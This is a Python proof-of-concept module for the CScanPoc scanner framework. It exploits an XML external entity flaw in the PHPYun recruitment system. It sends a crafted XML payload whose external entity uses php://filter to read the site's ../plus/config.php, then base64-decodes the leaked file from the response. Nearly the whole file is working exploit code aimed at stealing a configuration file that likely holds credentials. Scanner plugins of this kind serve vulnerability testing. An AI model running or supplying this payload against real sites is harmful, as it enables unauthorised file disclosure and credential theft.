# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import base64
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'PHPYun_0000'  # 平台漏洞编号，留空
    name = 'PHPYun人才系统任意文件读取(XML实体注入)'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-10'  # 漏洞公布时间
    desc = '''
        PHP云人才管理系统，专业的人才招聘网站系统开源程序，采用PHP 和MySQL 数据库构建的高效的人才与企业求职招招聘系统源码。
        PHPYun人才系统任意文件读取(XML实体注入)。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=064637'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PHPYun'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e65e28b0-96a2-4c00-8e24-75d19bd095d8'
    author = '国光'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg + '/weixin/index.php?signature=da39a3ee5e6b4b0d3255bfef95601890afd80709'
            content_type = 'Content-Type: text/xml'
            data = '''<?xml version="1.0" encoding="utf-8"?>
                <!DOCTYPE copyright [
                <!ENTITY test SYSTEM "php://filter/read=convert.base64-encode/resource=../plus/config.php">
                ]>
                <xml>
                <ToUserName>&test;</ToUserName>
                <FromUserName>1111</FromUserName>
                <MsgType>123</MsgType>
                <FuncFlag>3</FuncFlag>
                <Content>1</Content>
                </xml>'''
            code, head, res, err, _ = hh.http(
                url, post=data, header=content_type)
            if code != 200:
                return False
            m = re.search(
                r'<FromUserName><!\[CDATA\[([a-zA-Z0-9/+=]*)\]\]>', res)
            if not m:
                return False
            config_file = base64.b64decode(m.group(1))
            if("<?php" in config_file) and ("?>" in config_file):
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
